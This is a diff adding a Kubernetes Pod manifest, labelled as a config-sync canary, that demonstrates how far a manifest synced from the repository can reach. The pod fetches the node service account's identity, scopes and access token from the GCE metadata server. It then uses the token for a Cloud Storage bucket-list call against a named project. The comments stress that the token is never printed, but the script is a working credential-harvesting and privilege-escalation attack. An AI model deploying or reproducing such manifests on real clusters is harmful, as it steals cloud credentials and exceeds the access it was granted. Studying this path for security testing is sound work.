@@ -1,0 +1,31 @@
+# Shows how far a manifest from this repository reaches: it schedules a pod, the pod asks
+# the node's metadata server for the node service account, and performs ONE read-only call
+# with it, printing only the HTTP status and the account's own identity.
+# The token itself is never printed and never leaves the cluster.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: zz-configsync-canary-nodesa
+  namespace: default
+spec:
+  restartPolicy: Never
+  containers:
+  - name: c
+    image: gcr.io/google-containers/busybox:1.27
+    command:
+    - sh
+    - -c
+    - |
+      M=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default
+      echo "--- node service account identity ---"
+      wget -qO- --header='Metadata-Flavor: Google' $M/email
+      echo
+      echo "--- scopes ---"
+      wget -qO- --header='Metadata-Flavor: Google' $M/scopes
+      T=$(wget -qO- --header='Metadata-Flavor: Google' $M/token | sed 's/.*"access_token":"//;s/".*//')
+      echo "--- token length (never printed) ---"
+      echo $T | wc -c
+      echo "--- one project-scoped read with it: storage buckets.list ---"
+      wget -S -qO- --header="Authorization: Bearer $T" \
+        "https://storage.googleapis.com/storage/v1/b?project=project-3def3b56-88aa-4774-9d9&fields=kind" 2>&1 | head -4
+      echo "--- DONE-NODESA ---"
